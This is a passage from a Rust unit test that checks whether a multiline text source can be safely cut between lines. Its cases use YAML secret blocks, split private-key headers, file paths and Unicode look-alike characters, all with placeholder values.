        ("block scalar", "secret: |", "  AbCdEfGh", false),
        (
            "block scalar wide space",
            "secret: |",
            "\u{3000}AbCdEfGh",
            false,
        ),
        ("armor", "-----BEGIN RSA", "PRIVATE KEY-----", false),
        (
            "armor folded",
            "-----BEGIN \u{212A}",
            "PRIVATE KEY-----",
            false,
        ),
        ("path", "C:\\Users\\Synthetic", "Dir\\file.txt", false),
        ("path stop", "/srv/Synthetic;", "Dir/file.txt", true),
        (
            "escape in a path",
            "C:\\Users\\Synthetic;",
            "Dir\\file.txt",
            false,
        ),
        (
            "path wide space",
            "/srv/Synthetic",
            "Dir\u{3000}x/file.txt",
            false,
        ),
    ];
    for (case, left, next, safe) in cases {
        let text = format!("{left}\n{next}");
        let mut source = MultilineSource::new(&text, 4096);
        assert_eq!(
            source.cut_is_safe(&url_pass_line(left), 1),
            safe,
            "case {case}"
        );
    }
}
